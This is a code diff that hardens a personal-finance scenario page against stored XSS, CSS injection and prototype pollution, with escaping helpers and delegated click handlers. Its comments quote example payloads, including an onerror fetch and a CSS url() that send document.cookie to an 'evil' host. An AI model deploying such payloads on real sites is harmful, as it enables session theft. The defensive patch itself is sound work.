@@ -1,3 +1,96 @@
+// ── SECURITY HELPERS (FULL-P0-B1, audit 2026-05-26) ─────────────────────
+// All four shipped together because they protect adjacent attack surfaces
+// in the same renderer pipeline (cards → details → insights → table).
+//
+// 1) escHtml — 5-char escape applied to EVERY user-controlled value
+//    interpolated into innerHTML. Same invariant used codebase-wide
+//    (NW-P0-3, DASH-P1-12, G-P0-2, R-P0-8, DS-P0-MATH, J-P0-*, SAGE-P0-XSS,
+//    RC-P0-XSS, B-P0-XSS).
+function escHtml(s) {
+  return String(s == null ? '' : s).replace(/[&<>"']/g, (c) =>
+    ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
+}
+
+// 2) _safeColor — validates a CSS color token before it enters any style
+//    attribute. Without this, an attacker who saves a scenario with
+//    color="red;background-image:url(//evil/?cookie='+document.cookie+');"
+//    breaks out of the style="background:${sc.color}" interpolation. We
+//    allow only: a fixed allowlist of CSS variables we use (matches the
+//    color picker in scenarios.html) AND #RGB / #RRGGBB hex literals.
+//    Falls back to the neutral teal token on any reject.
+const _SAFE_CSS_VARS = new Set([
+  'var(--money)', 'var(--teal)', 'var(--red)', 'var(--amber)',
+  'var(--gold)', 'var(--text)', 'var(--text2)', 'var(--text3)',
+]);
+const _HEX_COLOR_RE = /^#(?:[0-9a-fA-F]{3}|[0-9a-fA-F]{6}|[0-9a-fA-F]{8})$/;
+function _safeColor(c) {
+  if (typeof c !== 'string') return 'var(--money)';
+  const t = c.trim();
+  if (_SAFE_CSS_VARS.has(t)) return t;
+  if (_HEX_COLOR_RE.test(t)) return t;
+  return 'var(--money)';
+}
+
+// 3) _safeParseJson — strips __proto__ / constructor / prototype keys
+//    from any parsed object. Pre-fix `JSON.parse(s)` on a tampered
+//    localStorage payload like `{"__proto__":{"isAdmin":true}}` would
+//    mutate Object.prototype globally on every page load. Same pattern
+//    as D-SEC-13, R-SEC-17.
+function _safeParseJson(str) {
+  try {
+    return JSON.parse(str, (k, v) => {
+      if (k === '__proto__' || k === 'constructor' || k === 'prototype') return undefined;
+      return v;
+    });
+  } catch (_) { return null; }
+}
+
+// 4) _pfcConfirm — promise-based modal that replaces native window.confirm().
+//    Native confirm() is silently no-op in iOS PWA standalone mode (the
+//    prompt is invisible) — the user thinks delete worked when it didn't.
+//    Mirrors NW-P1-6 / G-P1-D / R-P0-9 / RC-P0-MODAL pattern. Markup is
+//    #sc-confirm-modal in scenarios.html (added in this batch). Falls back
+//    to native confirm if the modal DOM isn't present.
+let _pfcConfirmActive = false;
+function _pfcConfirm(message, okLabel) {
+  return new Promise(function (resolve) {
+    if (_pfcConfirmActive) { resolve(false); return; }
+    _pfcConfirmActive = true;
+    const modal = document.getElementById('sc-confirm-modal');
+    const msgEl = document.getElementById('sc-confirm-msg');
+    const okBtn = document.getElementById('sc-confirm-ok');
+    const cancelBtn = document.getElementById('sc-confirm-cancel');
+    if (!modal || !msgEl || !okBtn || !cancelBtn) {
+      _pfcConfirmActive = false;
+      resolve(window.confirm(message));
+      return;
+    }
+    const previousFocus = document.activeElement;
+    msgEl.textContent = message;
+    okBtn.textContent = okLabel || 'Confirm';
+    modal.classList.add('open');
+    okBtn.focus();
+    function cleanup(result) {
+      modal.classList.remove('open');
+      okBtn.removeEventListener('click', onOk);
+      cancelBtn.removeEventListener('click', onCancel);
+      document.removeEventListener('keydown', onKey);
+      _pfcConfirmActive = false;
+      try { if (previousFocus && previousFocus.focus) previousFocus.focus(); } catch (_) {}
+      resolve(result);
+    }
+    function onOk() { cleanup(true); }
+    function onCancel() { cleanup(false); }
+    function onKey(e) {
+      if (e.key === 'Escape') cleanup(false);
+      if (e.key === 'Enter') cleanup(true);
+    }
+    okBtn.addEventListener('click', onOk);
+    cancelBtn.addEventListener('click', onCancel);
+    document.addEventListener('keydown', onKey);
+  });
+}
+
 // ── DATA ──
 const DEFAULT_USER = {
   income: 3000, otherIncome: 0,
@@ -13,7 +106,11 @@ function loadUser() {
   }
   try {
     const s = PFCStorage.get('user');
-    return s ? { ...DEFAULT_USER, ...JSON.parse(s) } : { ...DEFAULT_USER };
+    // FULL-P0-B1 — was raw JSON.parse; now goes through _safeParseJson which
+    // strips __proto__ / constructor / prototype keys to block prototype-
+    // pollution via a tampered localStorage payload.
+    const parsed = s ? _safeParseJson(s) : null;
+    return parsed ? { ...DEFAULT_USER, ...parsed } : { ...DEFAULT_USER };
   } catch(e) { return { ...DEFAULT_USER }; }
 }
 
@@ -47,7 +144,17 @@ function fmt(v) {
 function loadScenarios() {
   try {
     const s = PFCStorage.get('scenarios');
-    return s ? JSON.parse(s) : [];
+    // FULL-P0-B1 — was raw JSON.parse; now goes through _safeParseJson which
+    // strips __proto__ / constructor / prototype keys. A tampered localStorage
+    // payload like `[{"__proto__":{"isAdmin":true}}]` would have poisoned
+    // Object.prototype globally on every page load.
+    if (!s) return [];
+    const parsed = _safeParseJson(s);
+    if (!Array.isArray(parsed)) return [];
+    // Defensive: re-validate each scenario's color against the safelist so a
+    // legacy stored color that was injected before this fix can't escape
+    // its style="background:${color}" cell anymore.
+    return parsed.map(sc => sc && typeof sc === 'object' ? { ...sc, color: _safeColor(sc.color) } : sc).filter(Boolean);
   } catch(e) { return []; }
 }
 
@@ -235,32 +342,48 @@ function renderCards() {
 
   const allSc = getAllScenariosForChart();
 
+  // FULL-P0-B1 — pre-fix this rendered:
+  //   - `onclick="selectScenario('${sc.id}')"` (inline onclick + template
+  //     interpolation = CSP-bypass + JS-string-escape if sc.id contains `'`)
+  //   - `${sc.name}` and `${sc.desc}` raw into innerHTML (stored XSS via the
+  //     scenario editor — save a scenario named `<img src=x onerror=...>`
+  //     and it fires on every page load for the lifetime of localStorage)
+  //   - `style="background:${sc.color}"` (CSS-injection if color is malicious)
+  //
+  // Now: every interpolated value is escHtml'd; sc.color is _safeColor'd; the
+  // onclick handlers are gone — replaced with `data-action` attributes and a
+  // single delegated click listener wired AFTER the innerHTML assignment.
+  // Same pattern as G-P0-5 / R-P0-6+7 / SAGE-P0-CSP.
   container.innerHTML = allSc.map(sc => {
     const surplus = calcSurplus(sc);
     const nw12 = buildForecastData(sc, 12)[12];
     const score = calcHealthScore(sc);
     const isBase = sc.id === 'base';
     const isSelected = sc.id === selectedScenarioId;
+    const safeColor = _safeColor(sc.color);
+    const safeId = escHtml(sc.id);
+    const safeName = escHtml(sc.name);
+    const safeDesc = escHtml(sc.desc || (isBase ? 'Your current financial situation' : 'Custom scenario'));
 
     return `
     <div class="scenario-card ${isBase ? 'base-card' : ''} ${isSelected ? 'active-scenario' : ''}"
-         onclick="selectScenario('${sc.id}')">
-      <div class="scenario-color-dot" style="background:${sc.color}"></div>
+         data-sc-action="select" data-sc-id="${safeId}">
+      <div class="scenario-color-dot" style="background:${safeColor}"></div>
       <div class="scenario-card-info">
         <div class="scenario-card-name">
-          ${sc.name}
+          ${safeName}
           ${isBase ? '<span class="badge badge-blue">Current</span>' : ''}
         </div>
-        <div class="scenario-card-desc">${sc.desc || (isBase ? 'Your current financial situation' : 'Custom scenario')}</div>
+        <div class="scenario-card-desc">${safeDesc}</div>
       </div>
       <div class="scenario-metrics">
         <div class="sc-metric">
           <div class="sc-metric-label">Surplus/mo</div>
-          <div class="sc-metric-val ${surplus >= 0 ? 'up' : 'down'}">${surplus >= 0 ? '+' : '-'}${fmt(surplus)}</div>
+          <div class="sc-metric-val ${surplus >= 0 ? 'up' : 'down'}">${surplus >= 0 ? '+' : '-'}${escHtml(fmt(surplus))}</div>
         </div>
         <div class="sc-metric">
           <div class="sc-metric-label">12-mo NW</div>
-          <div class="sc-metric-val">${fmt(nw12)}</div>
+          <div class="sc-metric-val">${escHtml(fmt(nw12))}</div>
         </div>
         <div class="sc-metric">
           <div class="sc-metric-label">Score</div>
@@ -269,12 +392,29 @@ function renderCards() {
       </div>
       <div class="scenario-actions">
         ${!isBase ? `
-          <button class="sc-btn" onclick="event.stopPropagation();editScenario('${sc.id}')" title="Edit">✏</button>
-          <button class="sc-btn danger" onclick="event.stopPropagation();deleteScenario('${sc.id}')" title="Delete">✕</button>
+          <button type="button" class="sc-btn" data-sc-action="edit" data-sc-id="${safeId}" title="Edit" aria-label="Edit scenario ${safeName}">&#10000;</button>
+          <button type="button" class="sc-btn danger" data-sc-action="delete" data-sc-id="${safeId}" title="Delete" aria-label="Delete scenario ${safeName}">&#10005;</button>
         ` : ''}
       </div>
     </div>`;
   }).join('');
+
+  // FULL-P0-B1 — single delegated click listener for the card grid. Uses
+  // a sentinel to avoid re-binding on every renderCards() call (renderAll
+  // re-runs renderCards on every state change, so without the sentinel we
+  // would stack a new listener every render and leak memory).
+  if (!container.__sc_click_wired) {
+    container.__sc_click_wired = true;
+    container.addEventListener('click', (e) => {
+      const target = e.target.closest('[data-sc-action]');
+      if (!target) return;
+      const action = target.getAttribute('data-sc-action');
+      const id = target.getAttribute('data-sc-id') || '';
+      if (action === 'edit')    { e.stopPropagation(); editScenario(id); return; }
+      if (action === 'delete')  { e.stopPropagation(); deleteScenario(id); return; }
+      if (action === 'select')  { selectScenario(id); return; }
+    });
+  }
 }
 
 // ── RENDER DETAIL PANEL ──
@@ -293,7 +433,10 @@ function selectScenario(id) {
   const income = (sc.income || 0) + (sc.otherIncome || 0);
   const expenses = (sc.housing || 0) + (sc.food || 0) + (sc.transport || 0) + (sc.otherExp || 0);
 
-  document.getElementById('detail-dot').style.background = sc.color;
+  // FULL-P0-B1 — _safeColor before style assignment so a malicious stored
+  // color can't break out of the inline style. .textContent is already safe
+  // for sc.name; no change needed there.
+  document.getElementById('detail-dot').style.background = _safeColor(sc.color);
   document.getElementById('detail-name').textContent = sc.name;
 
   const badge = document.getElementById('detail-badge');
@@ -322,7 +465,7 @@ function selectScenario(id) {
     <div class="detail-row"><span class="detail-row-label">Health score</span><span class="detail-row-val" style="color:${score>=75?'var(--teal)':score>=50?'var(--amber)':'var(--red)'}">
       ${score} / 100 ${score>=75?'🟢':score>=50?'🟡':'🔴'}
     </span></div>
-    ${sc.desc ? `<div style="margin-top:12px;font-size:12px;color:var(--text3);line-height:1.5;font-style:italic;">${sc.desc}</div>` : ''}
+    ${sc.desc ? `<div style="margin-top:12px;font-size:12px;color:var(--text3);line-height:1.5;font-style:italic;">${escHtml(sc.desc)}</div>` : ''}
   `;
 }
 
@@ -339,6 +482,11 @@ function renderInsights() {
   const base = allSc[0]; // current
   const insights = [];
 
+  // FULL-P0-B1 — every `${...name}` interpolation below is escHtml'd. Scenario
+  // names are user-controlled (the editor accepts any string); without escape
+  // an attacker who saves `<img src=x onerror=fetch('//evil/?'+document.cookie)>`
+  // would fire the payload on every page load of /scenarios for the victim.
+
   // Best surplus
   const bestSurplus = [...allSc].sort((a,b) => calcSurplus(b)-calcSurplus(a))[0];
   const baseSurplus = calcSurplus(base);
@@ -346,7 +494,7 @@ function renderInsights() {
     const diff = calcSurplus(bestSurplus) - baseSurplus;
     insights.push({
       icon: '💡', bg: 'rgba(43,182,125,0.12)',
-      text: `<strong>${bestSurplus.name}</strong> gives you the highest monthly surplus — <strong>${fmt(calcSurplus(bestSurplus))}/mo</strong>, that's ${fmt(diff)} more than your current situation.`
+      text: `<strong>${escHtml(bestSurplus.name)}</strong> gives you the highest monthly surplus — <strong>${escHtml(fmt(calcSurplus(bestSurplus)))}/mo</strong>, that's ${escHtml(fmt(diff))} more than your current situation.`
     });
   }
 
@@ -358,7 +506,7 @@ function renderInsights() {
     if (diff > 0) {
       insights.push({
         icon: '📈', bg: 'rgba(59,130,246,0.12)',
-        text: `<strong>${best12.name}</strong> builds <strong>${fmt(diff)} more net worth</strong> in 12 months compared to staying on your current path.`
+        text: `<strong>${escHtml(best12.name)}</strong> builds <strong>${escHtml(fmt(diff))} more net worth</strong> in 12 months compared to staying on your current path.`
       });
     }
   }
@@ -370,7 +518,7 @@ function renderInsights() {
     if (scoreDiff > 0) {
       insights.push({
         icon: '❤️', bg: 'rgba(224,82,82,0.1)',
-        text: `<strong>${bestScore.name}</strong> improves your financial health score by <strong>${scoreDiff} points</strong> to ${calcHealthScore(bestScore)}/100.`
+        text: `<strong>${escHtml(bestScore.name)}</strong> improves your financial health score by <strong>${scoreDiff} points</strong> to ${calcHealthScore(bestScore)}/100.`
       });
     }
   }
@@ -380,7 +528,7 @@ function renderInsights() {
   if (negSurplus.length > 0) {
     insights.push({
       icon: '⚠️', bg: 'rgba(245,166,35,0.1)',
-      text: `<strong>${negSurplus.map(s=>s.name).join(', ')}</strong> ${negSurplus.length > 1 ? 'result in' : 'results in'} a negative monthly surplus — you'd be spending more than you earn.`
+      text: `<strong>${negSurplus.map(s=>escHtml(s.name)).join(', ')}</strong> ${negSurplus.length > 1 ? 'result in' : 'results in'} a negative monthly surplus — you'd be spending more than you earn.`
     });
   }
 
@@ -452,19 +600,23 @@ function renderComparisonTable() {
     },
   ];
 
+  // FULL-P0-B1 — headers come from `allSc.map(s => s.name)`; row.label is
+  // hardcoded but row.vals[i].display already runs through fmt() (numbers
+  // only). escHtml on header (user-controlled name) AND on display values
+  // (defense-in-depth in case fmt ever returns something unexpected).
   wrap.innerHTML = `
     <div style="overflow-x:auto;">
     <table class="comparison-table">
       <thead>
         <tr>
-          ${headers.map((h,i) => `<th style="${i>0?'text-align:right;':''}">${h}</th>`).join('')}
+          ${headers.map((h,i) => `<th style="${i>0?'text-align:right;':''}">${escHtml(h)}</th>`).join('')}
         </tr>
       </thead>
       <tbody>
         ${rows.map(row => `
           <tr>
-            <td>${row.label}</td>
-            ${row.vals.map(v => `<td style="text-align:right;" class="${v.best?'best':v.bad?'worst':''}">${v.display}</td>`).join('')}
+            <td>${escHtml(row.label)}</td>
+            ${row.vals.map(v => `<td style="text-align:right;" class="${v.best?'best':v.bad?'worst':''}">${escHtml(v.display)}</td>`).join('')}
           </tr>
         `).join('')}
       </tbody>
@@ -617,10 +769,15 @@ function saveScenario() {
 
   const data = getModalData();
 
+  // FULL-P0-B1 — _safeColor at SAVE time too (in addition to LOAD-time
+   // sanitization in loadScenarios). Defense-in-depth: even if the color
+  // picker were ever extended to allow custom hex input, the safelist
+  // would catch anything that doesn't match the hex regex.
+  const safeColorAtSave = _safeColor(selectedColor);
   if (editingId) {
     const idx = SCENARIOS.findIndex(s => s.id === editingId);
     if (idx > -1) {
-      SCENARIOS[idx] = { ...SCENARIOS[idx], ...data, name, desc: document.getElementById('sc-desc').value.trim(), color: selectedColor };
+      SCENARIOS[idx] = { ...SCENARIOS[idx], ...data, name, desc: document.getElementById('sc-desc').value.trim(), color: safeColorAtSave };
     }
     showToast('✓ Scenario updated');
   } else {
@@ -628,7 +785,7 @@ function saveScenario() {
       id: 'sc_' + Date.now(),
       name,
       desc: document.getElementById('sc-desc').value.trim(),
-      color: selectedColor,
+      color: safeColorAtSave,
       createdAt: new Date().toISOString(),
       ...data
     });
@@ -651,12 +808,19 @@ function editScenario(id) {
 }
 
 function deleteScenario(id) {
-  if (!confirm('Delete this scenario?')) return;
-  SCENARIOS = SCENARIOS.filter(s => s.id !== id);
-  if (selectedScenarioId === id) selectedScenarioId = null;
-  saveScenarios();
-  renderAll();
-  showToast('Scenario deleted');
+  // FULL-P0-B1 — was native window.confirm(). On iOS PWA standalone the
+  // prompt is invisible, so the user taps Delete → nothing happens →
+  // taps again → still nothing. _pfcConfirm is the codebase-standard
+  // promise-based modal (same as NW-P1-6 / G-P1-D / R-P0-9 / RC-P0-MODAL).
+  // Fallback to confirm() if the modal markup is missing (defensive only).
+  _pfcConfirm('Delete this scenario?', 'Delete').then((ok) => {
+    if (!ok) return;
+    SCENARIOS = SCENARIOS.filter(s => s.id !== id);
+    if (selectedScenarioId === id) selectedScenarioId = null;
+    saveScenarios();
+    renderAll();
+    showToast('Scenario deleted');
+  });
 }
 
 // ── TOAST ──
